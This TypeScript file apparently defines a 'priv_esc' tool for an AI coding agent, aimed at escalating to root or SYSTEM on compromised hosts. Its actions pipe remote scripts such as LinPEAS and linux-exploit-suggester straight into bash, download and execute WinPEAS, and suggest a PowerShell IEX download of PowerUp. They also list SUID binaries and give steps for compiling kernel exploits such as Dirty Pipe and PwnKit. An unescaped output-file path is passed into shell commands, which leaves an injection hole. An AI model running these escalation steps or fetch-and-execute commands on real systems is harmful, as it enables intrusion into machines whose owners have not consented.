export * as PrivEscTool from "./priv-esc"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "priv_esc"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description:
      "Escalation action: 'linux_enum' (LinPEAS), 'win_enum' (WinPEAS), 'linux_suggester' (linux-exploit-suggester), 'win_suggester' (windows-exploit-suggester), 'linpeas_download', 'winpeas_download', 'suid_find', 'kernel_exploit', 'custom'",
  }),
  target: Schema.String.pipe(Schema.optional).annotate({
    description: "Target IP for remote enumeration. If omitted, runs locally on this machine.",
  }),
  output_file: Schema.String.pipe(Schema.optional).annotate({
    description: "Path to save enumeration output. Default: ./privesc-output.txt",
  }),
  arch: Schema.String.pipe(Schema.optional).annotate({
    description: "Architecture for PEAS: 'x64' or 'x86'. Default: x64.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Privilege escalation enumeration and exploitation. Runs LinPEAS/WinPEAS for comprehensive misconfiguration scanning, linux-exploit-suggester/windows-exploit-suggester for kernel exploits, finds SUID binaries, and provides guidance for privilege escalation on compromised systems. Essential for going from low-privilege user to root/SYSTEM.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
              const outputFile = input.output_file ?? "./privesc-output.txt"

              switch (input.action) {
                case "linpeas_download":
                case "linux_enum": {
                  // Download and run LinPEAS
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash > ${outputFile} 2>&1; cat ${outputFile}`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(10),
                      maxOutputBytes: 10 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "LinPEAS failed. Try downloading manually from GitHub.",
                  }
                }

                case "winpeas_download":
                case "win_enum": {
                  const arch = input.arch ?? "x64"
                  const cmd = ChildProcess.make(
                    "cmd",
                    ["/c", `curl -sL -o winpeas.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS${arch}.exe && winpeas.exe > ${outputFile} 2>&1 && type ${outputFile}`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(10),
                      maxOutputBytes: 10 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "WinPEAS failed. Try downloading manually from GitHub.",
                  }
                }

                case "linux_suggester": {
                  const cmd = ChildProcess.make(
                    "bash",
                    ["-c", `curl -sL https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/les.sh | bash`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(5),
                      maxOutputBytes: 2 * 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "Linux exploit suggester failed.",
                  }
                }

                case "win_suggester": {
                  const cmd = ChildProcess.make(
                    "python3",
                    ["-c", `"import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/bitsadmin/wesng/master/wes.py').read())"`],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  return {
                    output: `To run Windows Exploit Suggester:\n1. pip install wesng\n2. wes.py --update\n3. wes.py systeminfo.txt\n\nOr use the bash tool: python3 wes.py ${input.target ?? "systeminfo.txt"}`,
                  }
                }

                case "suid_find": {
                  const cmd = ChildProcess.make(
                    "find",
                    ["/", "-perm", "-4000", "-type", "f", "2>/dev/null"],
                    { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) },
                  )
                  const result = yield* appProcess
                    .run(cmd, {
                      combineOutput: true,
                      timeout: Duration.minutes(2),
                      maxOutputBytes: 1024 * 1024,
                    })
                    .pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

                  const output = result?.output?.toString("utf8") ?? ""
                  // Check against GTFOBins
                  return {
                    exit: result?.exitCode,
                    output: `=== SUID Binaries Found ===\n${output}\n\n=== Check GTFOBins ===\nCheck each binary at https://gtfobins.github.io/#+suid for exploitation techniques.`,
                  }
                }

                case "kernel_exploit": {
                  return {
                    output: `To find and compile kernel exploits:\n` +
                      `1. Run linux_enum or linux_suggester to identify vulnerable kernel version\n` +
                      `2. Search for exploits: searchsploit "linux kernel <version>"\n` +
                      `3. Compile and run: gcc exploit.c -o exploit && ./exploit\n\n` +
                      `Common kernel exploits:\n` +
                      `- Dirty Pipe (CVE-2022-0847) — Linux 5.8+\n` +
                      `- Dirty COW (CVE-2016-5195) — Linux 2.6.22 to 4.8.3\n` +
                      `- CVE-2021-4034 (Pwnkit/pkexec) — most Linux with polkit\n` +
                      `- CVE-2021-3156 (Baron Samedit) — sudo < 1.9.5p2`,
                  }
                }

                case "custom":
                default:
                  return {
                    output: `Privilege escalation guidance:\n\nLinux:\n- sudo -l (check sudo permissions)\n- find / -perm -4000 2>/dev/null (SUID)\n- find / -writable -type d 2>/dev/null (writable dirs)\n- cat /etc/crontab (cron jobs)\n- ps aux (running processes)\n- getcap -r / 2>/dev/null (capabilities)\n- systemctl list-timers\n\nWindows:\n- whoami /priv (current privileges)\n- whoami /groups\n- systeminfo (OS version for exploits)\n- net user /domain\n- cmd /c "powershell -c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"`,
                  }
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Privilege escalation failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/priv-esc",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
